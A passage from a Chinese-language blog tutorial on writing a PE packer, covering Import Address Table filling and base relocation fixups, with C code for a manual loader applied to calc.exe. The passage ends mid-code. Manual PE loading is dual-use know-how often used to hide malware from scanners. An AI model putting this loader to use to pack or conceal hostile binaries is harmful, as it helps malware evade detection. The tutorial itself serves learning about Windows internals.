&lt;p>至此，&lt;em>IAT&lt;/em> 填充完成。&lt;/p>
&lt;p>完整代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// load the address of the import descriptors array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">import_descriptors&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this array is null terminated
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get the name of the dll, and import it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">module_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">import_module&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibraryA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">module_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;import module is null&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// the lookup table points to function names or ordinals =&amp;gt; it is the IDT
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lookup_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// the address table is a copy of the lookup table at first
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// but we put the addresses of the loaded function inside =&amp;gt; that&amp;#39;s the IAT
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">address_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">FirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// null terminated array, again
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Check the lookup table for the adresse of the function name to import
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_ORDINAL_FLAG&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// if first bit is not 1
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// import by name : get the IMAGE_IMPORT_BY_NAME struct
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">image_import&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this struct points to the ASCII function name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">funct_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_import&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// get that function address from it&amp;#39;s module and name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">funct_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// import by ordinal, directly
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPSTR&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;function handle is null&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// change the IAT, and put the function address inside.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">address_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">function_handle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x04-重定位">0x04 重定位&lt;/h2>
&lt;h3 id="41-重定位介绍">4.1 重定位介绍&lt;/h3>
&lt;p>回顾下前文我们做的事情：&lt;/p>
&lt;ol>
&lt;li>打开 calc.exe ，读取它的文件头。&lt;/li>
&lt;li>calc.exe 文件头中有一个 &lt;code>ImageBase&lt;/code> ，保存它倾向于使用的内存基址。&lt;/li>
&lt;li>calc.exe 启用了 ASLR 技术，所以理论上我们可以把它放到内存中任意位置。&lt;/li>
&lt;li>我们用 &lt;code>VirtualAlloc&lt;/code> 分配了内存，以&lt;code>NULL&lt;/code>作为首参数，让操作系统决定在哪儿分配，结果用作镜像基址。&lt;/li>
&lt;li>我们导入了必要的函数并把地址存放在 IAT 里。&lt;/li>
&lt;/ol>
&lt;p>然后现在，某时某刻，calc.exe 需要调用被导入的函数，用我们之前提过的方法。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-01/call_IAT.jpg"
width="543"
height="125"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-01/call_IAT_hu889b99c9eb0c20be37b0dc63e7aa4f3e_34329_480x0_resize_q75_box.jpg 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-01/call_IAT_hu889b99c9eb0c20be37b0dc63e7aa4f3e_34329_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
alt="call_IAT"
class="gallery-image"
data-flex-grow="434"
data-flex-basis="1042px"
>&lt;/p>
&lt;p>仔细观察图中的 opcode：&lt;code>FF15&lt;/code>，紧跟着的是小端序的&lt;code>0x004b3038&lt;/code>，一个绝对地址（前文所述的VA），指向 &lt;em>IAT&lt;/em> 中 &lt;code>ShellExecuteW&lt;/code> 函数的地址。这对于一个预期自己会被映射到随机基址上的PE文件来说，是一个巨大的问题。&lt;/p>
&lt;p>比如说，我们把 calc.exe 放置在 &lt;code>0x00500000&lt;/code> 而不是文件头中”偏好“的镜像基址 &lt;code>0x00400000&lt;/code>，这条 &lt;code>call&lt;/code> 指令还保持不变的话，它会尝试去访问地址 &lt;code>0x004b3038&lt;/code> ——但这不是 calc.exe 的内存空间！那儿可能有任何东西，也可能什么也没有。&lt;/p>
&lt;p>我们这里看到的是，当我们移动了 PE 文件在内存中的基址，汇编代码也需要在运行时修补，来响应基址的变化。这就是重定位所关注的事情。&lt;/p>
&lt;h3 id="42-pe重定位结构">4.2 PE重定位结构&lt;/h3>
&lt;p>重定位结构比导入表简单得多。&lt;/p>
&lt;p>同样的，在 Data Directory 里有一个重定位表，结构和导入表类似，看图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-01/basereloc.png"
width="980"
height="793"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-01/basereloc_hu4e0f540e5f0dc51830fd117d9f67457f_361570_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-01/basereloc_hu4e0f540e5f0dc51830fd117d9f67457f_361570_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20210927134554770"
class="gallery-image"
data-flex-grow="123"
data-flex-basis="296px"
>&lt;/p>
&lt;p>实际上每个&lt;code>IMAGE_BASE_RELOCATION&lt;/code>反应的就是一个 Windows 页（因为每个&lt;code>fixup&lt;/code>的偏移最大取值只有 12bits，0x1000，4KB）。&lt;/p>
&lt;p>其中每个 &lt;code>fixup&lt;/code> 都是一个 &lt;code>WORD&lt;/code> ，前 4bits 表示重定位类型，后 12bits 表示相对 &lt;code>IMAGE_BASE_RELOCATION.VirtualAddress&lt;/code> 的偏移值，偏移处需要应用重定位（就是加上真实基地址和PE头中基地址的差）。&lt;/p>
&lt;h3 id="43-修复重定位">4.3 修复重定位&lt;/h3>
&lt;p>修复重定位必须在PE头和Sections加载到内存之后，设置内存保护之前进行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is how much we shifted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ImageBase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// if there is a relocation table, and we actually shitfted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在代码的开始，需要确认是不是有必要做重定位。如果基地址和PE文件头中给出的基地址相同，那就不用考虑重定位了。判断方式是拿真实基地址减去文件头里给出的基地址，非0则说明基地址需要重定位。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// calculate the relocation table address
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>从RVA得到重定位表指针，然后就是遍历。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// once again, a null terminated array
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// switch to the next relocation block, based on the size
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SizeOfBlock&lt;/code>其实是包括&lt;code>IMAGE_BASE_RELOCATION&lt;/code>（Header）和属于这个块的所有 &lt;em>fixup&lt;/em> 组成的总大小，这里强制转换成 DWORD 后相加就得到了下一个 &lt;code>IMAGE_BASE_RELOCATION&lt;/code> 结构的地址。&lt;/p>
&lt;p>同样的，这也是前文所述的 &lt;code>null terminated array&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// how any relocation in this block
&lt;/span>&lt;span class="c1">// ie the total size, minus the size of the &amp;#34;header&amp;#34;, divided by 2 (those are words, so 2 bytes for each)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// the first relocation element in the block, right after the header (using pointer arithmetic again)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fixups&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在循环体内，先计算出了元素总数（(总大小(字节) - &lt;code>IMAGE_BASE_RELOCATION&lt;/code> 结构大小(字节)) / 2 ），然后用指针算术取得第一个元素的地址。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// type is the first 4 bits of the relocation word
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// offset is the last 12 bits
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x0fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is the address we are going to change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// there is only one type used that needs to make a change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">IMAGE_REL_BASED_HIGHLOW&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>遍历所有元素。如上文所述的，把每个 &lt;code>fixup&lt;/code> 取高位4比特和低位12比特，计算出要修补的地址。再根据修补的类型来应用。&lt;/p>
&lt;p>参考&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types" target="_blank" rel="noopener"
>微软文档的Base Relocation Types&lt;/a>。值得注意 type 就两个：&lt;code>IMAGE_REL_BASED_HIGHLOW&lt;/code> 和 &lt;code>IMAGE_REL_BASED_DIR64&lt;/code> ，分别是 32位和64位的重定向。其他16位重定向不多说了。&lt;/p>
&lt;p>完整代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is how much we shifted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ImageBase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// if there is a relocation table, and we actually shitfted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the relocation table address
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// once again, a null terminated array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// how any relocation in this block
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// ie the total size, minus the size of the &amp;#34;header&amp;#34;, divided by 2 (those are words, so 2 bytes for each)
